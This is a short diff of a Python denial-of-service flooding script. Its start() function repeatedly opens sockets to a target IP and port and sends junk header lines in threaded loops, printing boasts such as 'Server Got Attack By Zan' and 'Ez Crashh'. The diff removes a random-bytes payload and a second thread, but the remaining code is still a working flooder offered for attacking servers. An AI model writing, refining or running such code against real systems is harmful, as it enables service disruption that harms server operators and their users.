@@ -160,7 +160,6 @@ def start():
   global useragents, acceptall, ref, socks5
   hh = random._urandom(75006)
   byte2 = random._urandom(34002)
-  edit_host = hh + byte2 + "\r\n"
   xx = int(0)
   userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
   Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
@@ -175,10 +174,8 @@ def start():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_host))
-            s.send(edit_host)
             for i in range(pack):
                 s.send(str.encode(main_host))
-                s.send(edit_host)
                 xx += random.randint(0, int(pack))
             print("Server Got Attack By Zan ")
         except:
@@ -186,8 +183,6 @@ def start():
             print("Ez Crashh")
 for i in range(th):
   th1 = threading.Thread(target=start)
-  th2 = threading.Thread(target=start)
   th1.start()
-  th2.start()
 
   #aku mah pemula bisa apa?
